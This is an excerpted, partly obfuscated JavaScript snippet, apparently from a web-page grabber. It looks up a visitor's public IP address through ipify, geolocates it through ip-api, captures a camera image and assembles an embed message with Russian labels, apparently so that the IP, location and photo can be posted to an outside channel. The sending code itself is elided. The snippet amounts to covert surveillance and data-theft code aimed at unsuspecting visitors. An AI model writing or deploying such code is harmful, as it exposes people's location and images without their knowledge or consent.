...
async function sendEmbed(ip, geo) {
    const cameraImage = await captureCamera();
    ...
    const embed = {
        ...
        fields: [
            ...
            { name: "📷 Камера", value: cameraImage ? "✅ Доступна" : "❌ Не доступна", inline: true },
    ...
    if (cameraImage) {
        ...
        const imageBlob = await (await fetch(cameraImage)).blob();
...
fetch("https://api.ipify.org").then(_0x54be64 => _0x54be64.text()).then(_0x4443f2 => {
    fetch(`http://ip-api.com/json/${_0x4443f2}`)
        .then(r => r.json())
        .then(geoData => sendEmbed(_0x4443f2, geoData))
})
